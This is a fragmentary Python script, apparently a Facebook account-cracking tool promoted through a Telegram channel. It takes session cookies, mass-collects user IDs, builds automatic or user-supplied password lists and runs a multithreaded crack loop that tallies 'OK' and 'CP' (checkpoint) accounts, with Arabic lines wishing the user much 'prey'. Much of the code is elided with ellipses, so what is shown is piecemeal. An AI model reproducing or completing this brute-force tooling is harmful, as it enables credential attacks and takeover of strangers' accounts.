...
import webbrowser
lo = '''
عذرا عزيزيي عليك الاشتراك بل قناه اولا 
https://t.me/ESP_OM
'''
...
class Login:
    ...
    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
...
CHANEL : @ESP_OM
V : V2'''))
		cookie=input(f' ENTER COOKIES 2 :  ')
...
def dump_massal():
	...
	try:
		print('')
		print(Z+f' TRUE ID :  {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#    print('>> 2. Free ')
  ...
  #  print('>> 4. Mbasic ')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('>> SHOW INFO (Y/N) :  ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['n','N']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('>> AUTO PASS (Y/N) :  ')
	if pwplus in ['n','N']:
		pwpluss.append('ya')
		pwku=input('>> ENTER PASS : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
CHANEL : @ESP_OM
V : V2
جاري الفحص اتمنى لك صيدا كثيرا
صلي على محمد وال محمد'''))
	passwrd() 
def passwrd():
	
	
	with tred(max_workers=55) as pool:
		for yuzong in id2:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s{ [WAIT] %s/%s ➙ [OK] %s ➙ [CP] %s .. } %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
